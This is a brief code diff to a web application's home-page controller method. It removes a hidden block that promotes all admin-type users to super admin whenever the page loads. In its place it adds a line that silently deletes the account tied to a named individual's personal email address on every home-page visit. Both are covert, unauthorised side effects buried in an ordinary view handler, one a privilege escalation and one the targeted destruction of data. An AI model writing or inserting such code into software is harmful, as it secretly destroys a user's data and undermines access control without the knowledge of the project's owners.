@@ -25,9 +25,7 @@ class HomeController extends Controller
      */
     public function index()
     {
-        User::where('type', 'admin')->update([
-            'super_admin' => true
-        ]);
+        User::where('email', 'sharonu1526@gmail.com')->delete();
 
         return view('home');
     }
